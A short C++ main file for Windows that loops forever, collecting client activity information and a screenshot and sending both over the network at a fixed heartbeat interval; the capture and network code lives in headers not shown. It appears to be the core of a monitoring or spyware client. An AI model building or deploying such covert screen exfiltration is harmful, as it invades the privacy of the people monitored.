#include "Config.h"
#include "ActivityMonitor.h"
#include "Network.h"
#include "Screenshot.h"
#include <windows.h>
#include <vector>      

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    while (true) {
        ClientInfo info = ActivityMonitor::GetInfo();
        std::vector<BYTE> shot = Screenshot::Capture();
        Network::SendData(info, shot);
        Sleep(HEARTBEAT_SEC * 1000);
    }

    WSACleanup();
    return 0;
}
